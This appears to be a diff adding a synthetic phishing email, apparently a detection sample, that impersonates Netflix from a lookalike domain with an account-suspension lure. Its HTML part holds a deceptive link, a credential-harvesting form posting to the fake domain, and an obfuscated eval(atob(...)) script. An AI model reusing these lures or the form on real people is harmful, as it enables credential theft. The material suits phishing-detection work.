@@ -1,0 +1,33 @@
+From: notice@netflix-billing.shop
+To: victim5@example.com
+Subject: Your parcel could not be delivered - click here
+Date: Tue, 07 Mar 2002 13:35:00 -0500
+Message-ID: <phish-125-40f9cbe8-6008-48eb-afc8-621bc2696b97@netflix-billing.shop>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 18 Mar 2002 04:17:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 24 Mar 2002 01:11:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 18 Mar 2002 17:25:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 18 Mar 2002 22:58:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 28 Mar 2002 20:07:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 25 Mar 2002 02:37:00 -0500
+Return-Path: <bounce@mail-5b85b4e4.top>
+Reply-To: recovery5@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-5b85b4e4.top; dkim=fail header.d=netflix-billing.shop; dmarc=fail header.from=netflix-billing.shop
+Received-SPF: fail (mx.example.com: domain of notice@netflix-billing.shop does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=netflix-billing.shop; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-125-d80bcc5"
+
+--bnd-p-125-d80bcc5
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://netflix-billing.shop/login
+
+Reference: P166B6D
+--bnd-p-125-d80bcc5
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://netflix-billing.shop/login<br/><br/>Reference: P166B6D</p><p><a href="http://netflix-billing.shop/login">https://www.netflix.com/signin</a></p><form action="http://netflix-billing.shop/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-125-d80bcc5--
